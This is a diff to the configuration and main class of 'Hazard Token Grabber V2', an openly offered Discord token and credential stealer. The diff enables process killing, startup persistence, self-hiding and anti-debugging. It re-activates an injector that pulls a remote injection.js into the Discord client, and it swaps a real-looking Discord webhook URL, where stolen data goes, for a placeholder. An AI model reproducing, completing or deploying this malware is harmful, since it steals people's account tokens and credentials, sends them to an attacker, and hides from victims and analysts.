@@ -21,17 +21,17 @@ from win32crypt import CryptUnprotectData
 
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓
-    'webhook': "https://discord.com/api/webhooks/975834651778244768/cRLpRsx74fliZAK-i6wqWvhEsPRo4H8cYfKLQZQEscqMoHyoPBKzMHQ9JQOBFIBpijU2",
+    'webhook': "WEBHOOK_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': False,
+    'kill_processes': True,
     # if you want the file to run at startup
-    'startup': False,
+    'startup': True,
     # if you want the file to hide itself after run
-    'hide_self': False,
+    'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
-    'anti_debug': False,
+    'anti_debug': True,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
@@ -178,7 +178,7 @@ class Hazard_Token_Grabber_V2(functions):
             except RuntimeError:
                 continue
         self.neatifyTokens()
-        # await self.injector()
+        await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
 
